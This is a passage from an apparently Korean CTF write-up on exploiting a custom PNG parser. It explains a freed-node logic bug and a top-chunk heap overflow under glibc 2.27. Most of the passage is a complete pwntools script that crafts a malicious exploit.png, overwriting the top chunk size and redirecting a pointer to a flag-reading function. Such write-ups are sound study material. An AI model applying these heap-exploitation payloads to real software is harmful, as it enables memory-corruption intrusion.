</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">l_ptr</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">uint</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">type</span>, <span style="color:#e6db74">&#34;iTXt&#34;</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">payload</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hdr</span>, <span style="color:#a6e22e">secret_hdr</span>, <span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h2 id="exploitation-1">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation-1">#</a></h2>
<p>루프를 돌면서 로직 버그가 발생하며, free되면서 chunk_payload + 0x0에는 next freed 청크가 들어가기 때문에, 유저가 다음 노드를 조작할 수 있게 된다.
노드가 적다면, DFB를 트리거할 수 있지만, glibc 2.27의 검증 때문에 불가하다.
노드를 너무 늘리면 결국 singly linked list 형태로 bin에 쌓여서 NULL로 끝나게 되고, 순회하기 충분치 않아 null pointer dereference가 발생하여 DOS로 끝난다.
처음부터 top chunk를 덮으면 원하는 메모리 할당이 가능해진다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (<span style="color:#a6e22e">__int16</span>)<span style="color:#f92672">*</span><span style="color:#a6e22e">l_ptr</span>);                  <span style="color:#75715e">// sign extension
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v2</span> )                                     <span style="color:#75715e">// uninitiaized stack var
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">sec_msg_hdr</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">v2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">payload</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">4</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">r</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fwrite</span>(<span style="color:#e6db74">&#34;Error: malloc()\n&#34;</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">uLL</span>, <span style="color:#ae81ff">0x10</span><span style="color:#a6e22e">uLL</span>, <span style="color:#a6e22e">stderr</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_DWORD</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_DWORD</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">node</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">payload</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">recover</span>(<span style="color:#a6e22e">s</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">msg</span>, <span style="color:#a6e22e">r</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">p_secret_msg</span>, <span style="color:#a6e22e">secret_msg_length</span>);
</span></span></code></pre></div><p>이후 해독을 진행한다.</p>
<h3 id="exploit-script-1">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-1">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">pwn</span> <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">calc_crc</span>(<span style="color:#a6e22e">chunk</span><span style="color:#f92672">:</span><span style="color:#a6e22e">bytes</span>) <span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">u32</span>(<span style="color:#a6e22e">chunk</span>[<span style="color:#f92672">:</span><span style="color:#ae81ff">4</span>],<span style="color:#a6e22e">endian</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">def</span> <span style="color:#a6e22e">crc</span>(<span style="color:#a6e22e">init</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">int</span> , <span style="color:#a6e22e">asdf</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">bytes</span>, <span style="color:#a6e22e">l</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">int</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#a6e22e">l</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">init</span> <span style="color:#f92672">^=</span> <span style="color:#a6e22e">asdf</span>[<span style="color:#a6e22e">i</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">j</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">8</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">init</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xEDB88320</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">init</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">init</span><span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">v3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">init</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crc</span>(<span style="color:#ae81ff">0xffffffff</span>, <span style="color:#a6e22e">chunk</span>[<span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v5</span> <span style="color:#f92672">=</span> <span style="color:#f92672">~</span>(<span style="color:#a6e22e">crc</span>(<span style="color:#a6e22e">v5</span>, <span style="color:#a6e22e">chunk</span>[<span style="color:#ae81ff">8</span><span style="color:#f92672">:</span>],<span style="color:#a6e22e">sz</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">v5</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#a6e22e">data_length</span>, <span style="color:#a6e22e">type</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">bytes</span>, <span style="color:#a6e22e">data</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">bytes</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p32</span>(<span style="color:#a6e22e">data_length</span>,<span style="color:#a6e22e">endian</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">type</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">data</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">crc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">calc_crc</span>(<span style="color:#a6e22e">payload</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p32</span>(<span style="color:#a6e22e">crc</span>,<span style="color:#a6e22e">endian</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> (<span style="color:#a6e22e">a1</span> <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF00</span> <span style="color:#f92672">|</span> (<span style="color:#a6e22e">a1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF0000</span> <span style="color:#f92672">|</span> (<span style="color:#a6e22e">a1</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">|</span> <span style="color:#a6e22e">HIBYTE</span>(<span style="color:#a6e22e">a1</span>);
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">a1</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">a1</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">a</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">because</span> <span style="color:#a6e22e">chunks</span> <span style="color:#a6e22e">are</span> <span style="color:#a6e22e">linked</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">circular</span> <span style="color:#a6e22e">doubly</span> <span style="color:#a6e22e">linked</span> <span style="color:#a6e22e">list</span>, <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">enough</span> <span style="color:#a6e22e">freed</span> <span style="color:#a6e22e">chunks</span> <span style="color:#a6e22e">u</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">trigger</span> <span style="color:#a6e22e">DFB</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">glibc</span> <span style="color:#ae81ff">2.27</span> <span style="color:#a6e22e">has</span> <span style="color:#a6e22e">tcache</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">key</span> <span style="color:#a6e22e">validation</span>. <span style="color:#a6e22e">no</span> <span style="color:#a6e22e">dfb</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">masternode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">node3</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">node2</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">node1</span> 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">masternode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span>       <span style="color:#f92672">==</span> <span style="color:#a6e22e">current</span> <span style="color:#a6e22e">node</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">masternode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span>             <span style="color:#f92672">==</span> <span style="color:#a6e22e">prev</span> <span style="color:#a6e22e">node</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">masternode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">next</span> <span style="color:#a6e22e">node</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">unlink</span> , <span style="color:#a6e22e">pop</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">matsernode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">bk</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">masternode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">masternode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">masternode</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">fd</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">free</span> <span style="color:#a6e22e">payload</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">free</span> <span style="color:#a6e22e">node</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">trigger1</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0x1A</span>, <span style="color:#ae81ff">0x0A</span>])
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x20</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;IHDR&#39;</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">chunk</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>])<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p32</span>(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p32</span>(<span style="color:#ae81ff">0x378</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;iTXt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x28</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">chunk</span>))
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x7fffffffd7fc</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x30</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;NOD2&#39;</span>, <span style="color:#a6e22e">chunk</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x30</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;NOD1&#39;</span>, <span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>])<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x30</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;IEND&#39;</span>, <span style="color:#a6e22e">p32</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0xfe</span>])<span style="color:#f92672">+</span><span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">trigger2</span> <span style="color:#a6e22e">heapoverflow</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x4E</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x0D</span>, <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0x1A</span>, <span style="color:#ae81ff">0x0A</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pay</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pay</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0xf8</span><span style="color:#f92672">-</span><span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">pay</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pay</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0xffffffffffffffff</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pay</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100f8</span><span style="color:#f92672">-</span><span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">pay</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x100f8</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;IHDR&#39;</span>,<span style="color:#a6e22e">pay</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>])<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p32</span>(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p32</span>(<span style="color:#ae81ff">0xffffec58</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">size</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;iTXt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p32</span>(<span style="color:#ae81ff">0x400CC7</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>, <span style="color:#ae81ff">0xCA</span>, <span style="color:#ae81ff">0xFE</span>]) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">hdr</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">ptr</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;C&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x28</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">len</span>(<span style="color:#a6e22e">chunk</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">chunk</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">p64</span>(<span style="color:#ae81ff">0x6045bc</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">payload</span> <span style="color:#a6e22e">ptr</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x30</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;NOD2&#39;</span>, <span style="color:#a6e22e">chunk</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x30</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;NOD1&#39;</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">gen_chunk</span>(<span style="color:#ae81ff">0x30</span>, <span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;IEND&#39;</span>, <span style="color:#a6e22e">p32</span>(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#a6e22e">bytes</span>([<span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0xfe</span>])<span style="color:#f92672">+</span><span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">asdf</span> <span style="color:#a6e22e">ptr</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;./exploit.png&#39;</span>,<span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">f</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0x400CC7</span> <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">read</span> <span style="color:#a6e22e">flag</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0x13e4</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>      <span style="color:#a6e22e">victim</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">av</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">top</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">size</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chunksize</span> (<span style="color:#a6e22e">victim</span>);
